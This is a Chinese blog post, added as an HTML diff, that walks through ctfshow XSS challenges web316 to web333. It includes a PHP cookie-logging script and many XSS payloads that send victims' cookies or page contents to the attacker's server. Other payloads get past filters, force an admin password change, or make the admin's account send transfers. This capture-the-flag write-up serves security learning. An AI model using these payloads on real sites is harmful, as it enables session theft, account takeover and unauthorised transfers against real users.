@@ -1,0 +1,265 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow_xss_wp - Charmersix</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="跨站脚本攻击在这一套题目中体现的淋漓尽致。
+web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
+都差不多，比如http://xsscom.com/加载的还比较快,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="ctfshow_xss_wp - Charmersix"/>
+    <meta name="twitter:description" content="跨站脚本攻击在这一套题目中体现的淋漓尽致。
+web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
+都差不多，比如http://xsscom.com/加载的还比较快,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Charmersix"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="ctfshow_xss_wp - Charmersix"/>
+    <meta property="og:description" content="跨站脚本攻击在这一套题目中体现的淋漓尽致。
+web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
+都差不多，比如http://xsscom.com/加载的还比较快,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Charmersix</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow_xss_wp</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow_xss_wp</h1>
+        <div class="stuff">
+            <span>五月 14, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctfshow/" rel="tag">ctfshow</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>跨站脚本攻击在这一套题目中体现的淋漓尽致。</p>
+<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，</p>
+<p>都差不多，比如<a target="_blank" rel="noopener" href="http://xsscom.com/%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%98%E6%AF%94%E8%BE%83%E5%BF%AB%E3%80%82">http://xsscom.com/加载的还比较快。</a></p>
+<p>我用的自己服务器，贴上一个这个脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我这里建议文件名不要用xss，因为我刚开始用的xss，后边会有题目把xss过滤了。</p>
+<p>payload：</p>
+<p><code>&lt;script&gt;window.location.href=&#39;http://自己服务器IP/a.php?1=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p><code>window.location.href</code>可以理解成是，跳转到href里，具体参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Qian123/p/5345298.html#_label3">https://www.cnblogs.com/Qian123/p/5345298.html#_label3</a></p>
+<p><code>document.cookie</code>就是创建一个cookie,这里是把目标cookie窃取下来，具体参考<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-cookie.html">https://www.runoob.com/jsref/prop-doc-cookie.html</a></p>
+<h3 id="web317-319"><a href="#web317-319" class="headerlink" title="web317-319"></a>web317-319</h3><p>这里属于是一招鲜吃遍天了，这里过滤的东西都不一样，有img，script，xss</p>
+<p>但是payload:</p>
+<p><code>&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>无敌</p>
+<h3 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h3><p>过滤了空格，但是tab或者/或者/**/都可以用</p>
+<p>所以payload:</p>
+<p><code>&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>开始来到存储型XSS，难度起来了。</p>
+<p>这题注意收件人要是admin</p>
+<p>然后信的内容还是老样子</p>
+<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>这题打开会发现貌似没有传xss payload的地方，但是细心的同学会发现</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644982.png"></p>
+<p>也就是说，如果我们是admin，说不定就拿到flag了，那咱们有了admin的cookie，是不是就能伪装成admin呢</p>
+<p>那么还是怎么传payload的问题，密码为啥不能是payload，注册就拿到cookie了</p>
+<p>这题body不能用了，返璞归真，用script</p>
+<p><code>&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;</code></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644636.png"></p>
+<p>如果你很不幸x到了自己，出了多个sessionid，那么就选最后一个</p>
+<p>然后抓包，改个cookie就OK</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
+<h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>在这个例子中，admin的sessionid每次会话都会变，所以没办法使用sessionid进行登录（机器人好像设置的是上去一下就下来），那么思路就是让注入的XSS Payload自动读取本页面的带有<code>ctfshow</code>的字段并发到vps上。<br> 注册一个普通账号并登录，修改一个显示密码的地方为<code>ctfshow&#123;123456&#125;</code>，然后尝试直接在console中将这段字段读出来并发送到vps中，使用jQuery的类选择器：</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
+<p>群主就根据这个东西写出来了payloa</p>
+<p><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
+<p>还是拿这个当作密码，就可以了。</p>
+<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>上来先试一梭子上一题的payload，好像并没有成功。</p>
+<p>继续看这题多了个修改密码界面，那么只要让管理员修改成我们知道的密码，就能解决了</p>
+<p>x到管理员，还是得走我们的密码。先抓个包看看改密码的api</p>
+<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647725.png" style="zoom:67%;" />
+
+<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;</code></p>
+<p>这里的由于x的是admin，所以用了admin的本地IP<code>127.0.0.1</code></p>
+<p>注册，发现并没有什么用，试试用户名，你看那用户名，很长一筐，其实之前一直没用用户名，是因为用户名只能注册一次，但是密码可以重复</p>
+<p>或者保险起见，直接用户名密码全是xss</p>
+<p>好了，admin#123 登陆成功，为了防止自动跳转，这里抓一下</p>
+<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647186.png" style="zoom:67%;" />
+
+<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>上来，先试一试上一题的payload，好吧，并没有那么幸运</p>
+<p>这里注意到url，发现并不是get了，那么猜测是post，抓包一看，果然是</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111657280.png"></p>
+<p>仿照，post的源码，写个payload就好了</p>
+<img src="https://img-blog.csdnimg.cn/2374b981265e47b0937e36cfe3e3422b.png" style="zoom:67%;" />
+
+<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></p>
+<p>payload来喽，解决</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111656980.png"></p>
+<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>先试一下上一题的payload，就是说，只要拿到admin了，什么都好说，然后失败了，转换思路。</p>
+<p>这题很简单，要买flag嘛，但是钱不够，还有个转账口子</p>
+<p>尝试转负的，然后就成功了</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654005.png"></p>
+<p>购买flag，成功</p>
+<p>这题也可以给自己转账，然后会发现，给自己转账是不要钱的，然后就可以一直转，只要金额少于自己的余额就行。</p>
+<p>这里就不再演示了。</p>
+<p>然后这好像跟xss没什么关系，现在x不到admin的密码了，我们试一试能不能直接x一下admin转账，我们抓包看一下转账的传参</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654665.png"></p>
+<p>改一下上一题的payload</p>
+<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
+<p>搞定啊</p>
+<h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>首先试一试上一题，给自己转账是可行的，x到admin转账也是可行的。</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647124.png"></p>
+<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>js很重要，可以通过js搞整个网页</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="false"
+        data-ci="f71ceda7a670da0dc3de"
+        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
+        data-r="blog_comments"
+        data-o="Charmersix"
+        data-a="Charmersix"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316"><span class="toc-number">1.</span> <span class="toc-text">web316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web317-319"><span class="toc-number">2.</span> <span class="toc-text">web317-319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320-web326"><span class="toc-number">3.</span> <span class="toc-text">web320-web326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web327"><span class="toc-number">4.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web328"><span class="toc-number">5.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web329"><span class="toc-number">6.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web330"><span class="toc-number">7.</span> <span class="toc-text">web330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web331"><span class="toc-number">8.</span> <span class="toc-text">web331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web332"><span class="toc-number">9.</span> <span class="toc-text">web332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web333"><span class="toc-number">10.</span> <span class="toc-text">web333</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
